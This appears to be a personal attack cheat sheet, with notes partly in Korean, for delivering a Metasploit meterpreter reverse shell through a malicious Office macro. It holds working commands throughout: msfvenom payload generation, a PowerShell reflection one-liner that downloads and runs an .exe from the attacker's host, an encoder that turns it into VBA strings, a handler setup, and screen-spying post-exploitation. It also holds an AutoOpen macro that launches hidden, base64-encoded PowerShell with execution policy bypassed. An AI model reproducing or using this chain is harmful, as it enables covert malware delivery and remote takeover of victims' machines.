```
logic flow:
msfvenom -> and place it in C# NET LOADder. This will load the shell.  
 msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.20.131 lport=443 --encrypt aes256 --encrypt-key 'qaG+eb3eShkiYq3tuv9y!B&E)$@Mc%fT' --encrypt-iv '?aEe(fG+KbPe23fz' -f csharp


MeterStager.cs save the C# Loader file as .exe 
mcs meterstager.cs

공격자 칼리에서 .exe를 호스팅함
python -m http.server 9999

Powershell reflection 명령어을 통해서 .exe content를 가져와서 엔트리 포인트에서 시작하게함
위에 powershell reflection 명령어를 Invoke-VBAps.ps1에 넣어서 vba friendly하게 만듬
.이제 vba는 vba 난독화, powershell부분은 charmeleon사용하기

```
```
Invoke VBA
$s = @'
 iex([System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('http://192.168.20.131:9999/support.exe'))).EntryPoint.Invoke($null, [Object[]]@(@(,([String[]]@()))))
'@
 
<# Just copy/paste everything below! #>
$EncodedText =[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))  

$array = @()
[System.Collections.ArrayList]$ArrayList = $array
$EncodedText -split '(.{300})' | Where-Object {
    $ArrayList.Add($_) | out-null
}

foreach ($item in $ArrayList){
    if([string]::IsNullOrEmpty($item)){
        continue
    }
    else{
        if($item -eq $ArrayList[-1]){
            '"' + $item +'"' 
            break 
        }
        '"' + $item + '" & _'
    }
}
powershell -ep bypass
./script.ps1
```

```
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
 set LHOST 192.168.20.131
 set LPORT 443
set EnableStageEncoding true
set SessionCommunicationTimeout 0
exploit
```

Post Exploitation
```
background
search screen_spy
use 0
set session x
exploit
```
```
Sub Document_Open()
    test
End Sub

Sub AutoOpen()
    test
End Sub

Function test()
    Const HIDDEN_WINDOW = 120 

    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")

    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    
    Dim proc As Object
    Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    Dim str As String
    
    str = "powershell -exec bypass -nologo -nop -w hidden -enc " & _
"IABpAGUAeAAoAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAwAC4AMQAzADEAOgA5ADkAOQA5AC8AcwB1AHAAcABv" & _
"AHIAdAAuAGUAeABlACcAKQApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAFsATwBiAGoAZQBjAHQAWwBdAF0AQAAoAEAAKAAsACgAWwBTAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAKQApAA=="
    
    errReturn = proc.Create(str, Null, objConfig, intProcessID)
End Function




```
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```